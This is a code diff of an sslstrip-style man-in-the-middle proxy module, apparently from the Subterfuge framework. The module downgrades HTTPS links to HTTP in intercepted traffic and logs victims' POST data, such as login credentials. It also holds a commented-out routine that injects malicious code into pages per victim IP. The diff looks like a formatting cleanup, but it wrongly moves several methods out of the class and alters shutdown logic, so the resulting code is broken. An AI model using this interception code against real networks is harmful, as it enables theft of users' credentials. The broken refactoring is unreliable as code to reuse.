@@ -20,42 +20,44 @@ import logging, re, string, random, zlib, gzip, StringIO, os
 
 import sys
 import time
+
 sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
 import threading
-  #Ignore Deprication Warnings
+# Ignore Deprication Warnings
 import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning) 
 
-#Subterfuge Database Models
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+# Subterfuge Database Models
 
 print os.getpid()
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
 
-class ServerConnection(HTTPClient):
 
+class ServerConnection(HTTPClient):
     ''' The server connection is where we do the bulk of the stripping.  Everything that
     comes back is examined.  The headers we dont like are removed, and the links are stripped
     from HTTPS to HTTP.
     '''
 
-    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
-    urlType           = re.compile(r"https://", re.IGNORECASE)
-    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlExpression = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
+    urlType = re.compile(r"https://", re.IGNORECASE)
+    urlExplicitPort = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/', re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
-        self.command          = command
-        self.uri              = uri
-        self.postData         = postData
-        self.headers          = headers
-        self.client           = client
-        self.urlMonitor       = URLMonitor.getInstance()
-        self.isImageRequest   = False
-        self.isCompressed     = False
-        self.contentLength    = None
+        self.command = command
+        self.uri = uri
+        self.postData = postData
+        self.headers = headers
+        self.client = client
+        self.urlMonitor = URLMonitor.getInstance()
+        self.isImageRequest = False
+        self.isCompressed = False
+        self.contentLength = None
         self.shutdownComplete = False
-        
+
     #############################################
     '''
                #0sm0s1z
@@ -96,6 +98,7 @@ class ServerConnection(HTTPClient):
         #print data
         return data
     '''
+
     ############################################
 
 
@@ -106,7 +109,7 @@ class ServerConnection(HTTPClient):
         return "POST"
 
     def sendRequest(self):
-        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
+        logging.log(self.getLogLevel(), "Sending Request: %s %s" % (self.command, self.uri))
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
@@ -116,7 +119,8 @@ class ServerConnection(HTTPClient):
 
         self.endHeaders()
 
-      #r00t0v3r1d3
+        # r00t0v3r1d3
+
     def sendPostData(self):
         logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):" + str(self.postData))
         self.transport.write(self.postData)
@@ -125,7 +129,7 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
@@ -156,12 +160,12 @@ class ServerConnection(HTTPClient):
             self.client.setHeader(key, value)
 
     def handleEndHeaders(self):
-       if (self.isImageRequest and self.contentLength != None):
-           self.client.setHeader("Content-Length", self.contentLength)
+        if (self.isImageRequest and self.contentLength != None):
+            self.client.setHeader("Content-Length", self.contentLength)
 
-       if self.length == 0:
-           self.shutdown()
-                        
+        if self.length == 0:
+            self.shutdown()
+
     def handleResponsePart(self, data):
         if (self.isImageRequest):
             self.client.write(data)
@@ -172,83 +176,85 @@ class ServerConnection(HTTPClient):
         if (self.isImageRequest):
             self.shutdown()
         else:
-	    try:
+            try:
                 HTTPClient.handleResponseEnd(self)
-	    except:
-		pass
+            except:
+                pass
 
-    def handleResponse(self, data):
-        if (self.isCompressed):
-            logging.debug("Decompressing content...")
-            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-           
-        #print data           
-        '''
-        ####################################    
-            #Data manipulation determination
-            #0sm0s1z
-            
-        with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
-            clientip = file.readlines()    
-            
-        iptrack.objects.filter(id = "1").update(address = clientip[0])    
-        
-            #Check for Existing IP Address
+
+def handleResponse(self, data):
+    if (self.isCompressed):
+        logging.debug("Decompressing content...")
+        data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+
+    # print data
+    '''
+    ####################################
+        #Data manipulation determination
+        #0sm0s1z
+
+    with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
+        clientip = file.readlines()
+
+    iptrack.objects.filter(id = "1").update(address = clientip[0])
+
+        #Check for Existing IP Address
+    try:
+       check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
+
+           #Check for uninjected IP Address
+       if check.injected == "0":
+          if len(self.injection) > 2:
+              data = self.injectMaliciousCode(data, clientip[0])
+
+    except:
+        newip = iptrack(address = clientip[0], injected = "0")
+        newip.save()
+        print "New Client Detected! %s" % clientip[0]
+        if len(self.injection) > 2:
+           data = self.injectMaliciousCode(data, clientip[0])
+           #print data
+
+    '''
+    ####################################
+
+    logging.log(self.getLogLevel(), "Read from server:\n" + data)
+
+    data = self.replaceSecureLinks(data)
+
+    if (self.contentLength != None):
+        self.client.setHeader('Content-Length', len(data))
         try:
-           check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
-
-               #Check for uninjected IP Address   
-           if check.injected == "0":
-              if len(self.injection) > 2: 
-                  data = self.injectMaliciousCode(data, clientip[0])
-                    
+            self.client.write(data)
         except:
-            newip = iptrack(address = clientip[0], injected = "0")
-            newip.save()
-            print "New Client Detected! %s" % clientip[0]
-            if len(self.injection) > 2: 
-               data = self.injectMaliciousCode(data, clientip[0])            
-               #print data     
-                
-        '''
-        ####################################       
-            
-        logging.log(self.getLogLevel(), "Read from server:\n" + data)
-
-        data = self.replaceSecureLinks(data)
-
-        if (self.contentLength != None):
-            self.client.setHeader('Content-Length', len(data))
-        
-	try:
-        	self.client.write(data)
-	except:
-		pass
-	try:
+            pass
+        try:
             self.shutdown()
-	except:
-	    pass
+        except:
+            pass
 
-    def replaceSecureLinks(self, data):
-        iterator = re.finditer(ServerConnection.urlExpression, data)
 
-        for match in iterator:
-            url = match.group()
+def replaceSecureLinks(self, data):
+    iterator = re.finditer(ServerConnection.urlExpression, data)
 
-            logging.debug("Found secure reference: " + url)
+    for match in iterator:
+        url = match.group()
 
-            url = url.replace('https://', 'http://', 1)
-            url = url.replace('&amp;', '&')
-            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+        logging.debug("Found secure reference: " + url)
 
-        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-        return re.sub(ServerConnection.urlType, 'http://', data)
+        url = url.replace('https://', 'http://', 1)
+        url = url.replace('&amp;', '&')
+        self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
 
-    def shutdown(self):
-        if not self.shutdownComplete:
-            self.shutdownComplete = True
-	    try:
-                self.client.finish()
-	    except:
-		pass
-            self.transport.loseConnection()
+    data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+    return re.sub(ServerConnection.urlType, 'http://', data)
+
+
+def shutdown(self):
+    if not self.shutdownComplete:
+        self.shutdownComplete = True
+    try:
+        self.client.finish()
+    except:
+        pass
+    self.transport.loseConnection()
